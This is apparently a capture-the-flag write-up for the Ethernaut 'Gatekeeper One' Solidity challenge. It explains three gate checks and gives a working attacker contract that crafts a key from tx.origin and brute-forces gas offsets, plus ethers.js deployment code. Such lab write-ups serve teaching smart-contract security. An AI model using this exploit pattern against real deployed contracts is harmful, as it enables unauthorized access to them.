# Level 13: Gatekeeper One

## Challenge Overview

This challenge demonstrates the importance of modifier logic in Solidity.  
The goal is to bypass three restrictive gate conditions and gain access to the `enter` function.

## Goal

Solve the three gate conditions in the `GatekeeperOne` contract to call the `enter` function successfully.

## Solution

The `GatekeeperOne` contract has the following three gate conditions:

### 1. Gate 1

```solidity
require(msg.sender != tx.origin);
```

This requires the caller to be a contract (not an externally owned account).

### 2. Gate 2

```solidity
require(gasleft() % 8191 == 0);
```

The remaining gas when executing this condition must be a multiple of 8191.

### 3. Gate 3

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
require(uint32(uint64(_gateKey)) != uint64(_gateKey));
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
```

This imposes complex constraints on the `_gateKey` value, which involves a combination of type casting and alignment with `tx.origin`.



## Steps to Solve

### 1. Deploy an attacker contract with the following logic:

```solidity
pragma solidity ^0.8.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))) + 2**32);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = target.call{gas: i + 150 + 8191 * 3}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) break;
        }
    }
}
```

### 2. Adjust the gas to align with `gasleft() % 8191 == 0`  
Use a loop to iterate through possible gas amounts.

### 3. Deploy the `GatekeeperOneAttack` contract and call the `attack` function:

```javascript
const GatekeeperOneAttack = await ethers.getContractFactory("GatekeeperOneAttack");
const attacker = await GatekeeperOneAttack.deploy(targetAddress);
await attacker.attack();
```

### 4. Verify successful entry by calling the `enter` function of the `GatekeeperOne` contract.



## Lessons Learned

- Understand the implications of Solidity modifiers and how they validate function calls.
- Be cautious with strict gas requirements as they can lead to exploitable behavior.
- Always ensure typecasting requirements and logical checks are implemented securely.
